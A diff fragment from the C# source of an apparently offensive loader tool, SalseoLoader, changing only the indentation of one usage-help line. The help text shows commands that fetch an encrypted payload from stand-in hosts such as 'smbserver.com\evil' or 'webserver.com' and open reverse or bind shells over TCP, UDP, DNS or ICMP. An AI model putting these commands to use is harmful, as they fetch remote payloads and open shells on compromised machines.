@@ -84,7 +84,7 @@ namespace SalseoDecrypter
                 Console.WriteLine("    [-] SalseoLoader.exe password \\\\smbserver.com\\evil\\elfuckingmal.txt ReverseUDP LHOST LPORT");
                 Console.WriteLine("    [-] SalseoLoader.exe password c:\\temp\\elfuckingmal.txt ReverseICMP LHOST");
                 Console.WriteLine("    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseDNS LHOST ServerDNS");
-				Console.WriteLine("    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt BindTCP LHOST LPORT");
+		Console.WriteLine("    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt BindTCP LHOST LPORT");
                 Console.WriteLine("\n[+] Shells availables:\n\n    [-] ReverseTCP\n    [-] ReverseUDP\n    [-] ReverseDNS\n    [-] ReverseICMP\n    [-] BindTCP\n");
                 System.Environment.Exit(1);
 
